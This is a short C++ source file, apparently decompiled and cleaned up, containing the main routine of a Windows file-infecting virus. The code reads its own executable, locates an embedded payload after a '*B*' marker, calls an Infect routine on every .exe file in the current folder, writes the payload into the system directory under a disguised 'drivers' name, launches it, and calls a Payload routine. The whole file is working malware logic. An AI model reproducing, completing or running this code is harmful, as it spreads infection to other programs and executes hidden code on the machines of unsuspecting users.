#include "data_globals.h"
#include <fstream>      // std::ifstream, std::ofstream
#include <cstdlib>      // malloc, srand, rand
#include <ctime>        // time
#include <shellapi.h>   // ShellExecuteA
#include <cstring>      // strcat, strlen
#pragma optimize("", off)

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    volatile struct _LocalCtx {
        HMODULE hModule;
        std::ifstream inFile;
        std::streampos pos;
        int fileSize;
        int markerPos;
        int i;
        WIN32_FIND_DATAA findData;
        HANDLE hFind;
        time_t t;
        int randNum;
        char randStr[16];      // changed from char* to array
        CHAR systemPath[MAX_PATH];
        int payloadSize;
    } ctx;

    ctx.hModule = GetModuleHandleA(nullptr);
    GetModuleFileNameA(ctx.hModule, Virus, 0x104);
    Secret(Virus);

    inf = 0x2a;
    DAT_140008165 = 0x42;
    DAT_140008166 = 0x2a;

    // Cast away volatile to call std::ifstream methods
    const_cast<std::ifstream&>(ctx.inFile).open(reinterpret_cast<const char*>(Virus), std::ios::in | std::ios::binary);
    const_cast<std::ifstream&>(ctx.inFile).seekg(0, std::ios::end);
    std::streampos temp_pos = const_cast<std::ifstream&>(ctx.inFile).tellg();
    const_cast<std::streampos&>(ctx.pos) = temp_pos;
    ctx.fileSize = static_cast<int>(const_cast<const std::streampos&>(ctx.pos));
    const_cast<std::ifstream&>(ctx.inFile).seekg(0, std::ios::beg);

    VBuffer = static_cast<char*>(malloc(static_cast<size_t>(ctx.fileSize)));
    const_cast<std::ifstream&>(ctx.inFile).read(static_cast<char*>(VBuffer), ctx.fileSize);
    const_cast<std::ifstream&>(ctx.inFile).close();

    ctx.markerPos = -1;
    for (ctx.i = 0; ctx.i < ctx.fileSize; ++ctx.i) {
        if (VBuffer[ctx.i] == '*' && VBuffer[ctx.i + 1] == 'B' && VBuffer[ctx.i + 2] == '*') {
            ctx.markerPos = ctx.i;
            FBuffer = static_cast<char*>(VBuffer) + ctx.i + 3;
            break;
        }
    }

    ctx.hFind = FindFirstFileA("*.exe", const_cast<LPWIN32_FIND_DATAA>(&ctx.findData));
    if (ctx.hFind != INVALID_HANDLE_VALUE) {
        do {
            Infect(const_cast<char*>(ctx.findData.cFileName), static_cast<char*>(VBuffer));
        } while (FindNextFileA(ctx.hFind, const_cast<LPWIN32_FIND_DATAA>(&ctx.findData)));
        FindClose(ctx.hFind);
    }

    ctx.t = time(nullptr);
    srand(static_cast<unsigned int>(ctx.t));
    ctx.randNum = rand();
    sprintf_s(const_cast<char*>(ctx.randStr), sizeof(ctx.randStr), "%d", ctx.randNum);   // replaces itoa

    GetSystemDirectoryA(const_cast<LPSTR>(ctx.systemPath), MAX_PATH);
    strcat(const_cast<char*>(ctx.systemPath), "\\drivers");
    strcat(const_cast<char*>(ctx.systemPath), const_cast<const char*>(ctx.randStr));
    strcat(const_cast<char*>(ctx.systemPath), ".exe");

    if (FBuffer != nullptr) {
        std::ofstream outFile(const_cast<const char*>(ctx.systemPath), std::ios::out | std::ios::binary);
        if (ctx.markerPos != -1) {
            ctx.payloadSize = ctx.fileSize - (ctx.markerPos + 3);
            outFile.write(static_cast<const char*>(FBuffer), ctx.payloadSize);
        }
        outFile.close();
        ShellExecuteA(nullptr, nullptr, const_cast<LPCSTR>(ctx.systemPath), nullptr, nullptr, 5);
    }

    Payload();
    return 0;
}
#pragma optimize("", on)
